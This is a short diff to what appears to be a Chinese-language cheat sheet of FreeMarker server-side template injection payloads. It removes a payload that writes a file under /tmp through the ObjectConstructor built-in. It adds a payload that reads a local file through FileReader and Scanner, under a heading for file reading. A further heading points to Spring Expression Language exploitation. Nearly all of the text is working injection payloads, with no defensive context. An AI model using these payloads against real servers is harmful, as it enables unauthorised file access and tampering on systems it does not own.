@@ -39,7 +39,7 @@ ${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileWriter","/t
 ```
 读文件
 ```
-${"freemarker.template.utility.ObjectConstructor"?new()(java.io.FileWriter("/tmp/hh.txt").append("ttt").close())}
+<#assign+value="freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader","C:\\Temp\\test.txt")>${"freemarker.template.utility.ObjectConstructor"?new()("java.util.Scanner",value).useDelimiter("\\Aasd").next()}
 ```
 使用SPEL利用
 ```
